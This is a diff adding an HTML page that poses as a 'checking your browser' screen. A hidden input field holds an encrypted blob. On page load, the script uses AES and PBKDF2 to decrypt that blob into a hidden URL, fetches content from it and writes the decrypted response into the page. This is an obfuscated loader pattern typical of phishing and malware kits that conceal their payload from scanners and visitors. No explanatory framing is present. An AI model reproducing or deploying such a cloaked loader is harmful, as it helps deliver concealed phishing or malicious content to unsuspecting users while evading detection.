@@ -1,0 +1,23 @@
+<html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+ </head>
+ <body>
+	<p>Please wait a moment while we are checking your browser...</p>
+	<input hidden value="eyJhIjoic1ZcL1lHTUdnSWZQd05TTkR1bVVrdzhjRjFWQ2tBSXJGb0swck4xUnpDTXM9IiwiYyI6ImQ0OWNkMzM3NGZiZjUxZTNlZGY4ZDUyMmVmMjM2MGIyIiwiYiI6ImQ5Mzc2MDk0NjE5ZDE1NmFiMjc1ZmM2YzY4NzEzM2M4NDM2YmE5ODVhOWM1YzdkZTZlNjQyYTk3MDc3ZDdiN2JmYTk3OTEyOWMwMDcxY2RlZDM0YThjODU2YTdmZTVlMzRkOWI2MTU2MWVkNzViNzRmOWJiOTE5MTViYzlhOTM2ODk2NDQxOWU1ZmIzMmUyZmQxMzI1NWFhMWZjYWYzYzYxYjYyYjI4OWM3ZjcyOTJlNzBlZDY5ZWQ1MTIwMmU5OGI5M2E5NGQ1ZDA4NGExN2FkYjEzNDA5MTRhODgxZmVmNDhjNGNiNmNmMTM2Yzk5YWIyMmQ5MGRjNzgzNzY1NmY3NmQzYzMzZmE1ZWNjNjE1M2M5OTc4OGZkMzU5ZTZmNjQxYTI0Y2QwOTJhMjFlMDRlZDQyNDVlNjM1NDNhNjU2NmJhYzQ1Nzk3NDI2NjM0MWVlOGJmNzI3M2JhZTcxYzQzNGFmYTI1MjljNWY0MDE0ZmY1OTU3YzhjODE0ZTU3MDE3NzRkYzBlNzdkMGZlMjc2ZmUwZWE1MzkyNTdkYWQ2ODY4NTE1NTE4NTA0NzRjN2E0YzQxNDkzOTRmMjBmZmI5YWIxMjM3MjY0NTI2NmNiMjE5ZjAyYWEwMmZiYzcwZjAwNTFhMDdiNGViZTBhYmJmZTM2NjVlZjAxMWNlOGY4IiwiZCI6IjQxNjU3YTRkIn0=">
+ </body>
+<script>
+    async function dNZE(uzv) {
+        var {a,b,c,d} = JSON.parse(uzv);
+        return CryptoJS.AES.decrypt(a, CryptoJS.PBKDF2(CryptoJS.enc.Hex.parse(d), CryptoJS.enc.Hex.parse(b), {hasher: CryptoJS.algo.SHA512, keySize: 64/8, iterations: 999}), {iv: CryptoJS.enc.Hex.parse(c)}).toString(CryptoJS.enc.Utf8);
+    }
+    (async () => {
+        document.write(await dNZE(await (await fetch(await dNZE(atob(document.querySelector('input').value)), {
+            method: 'POST', body: JSON.stringify({ ebym: "iGY" })
+        })).text()));
+    })();
+</script>
+
+</html>
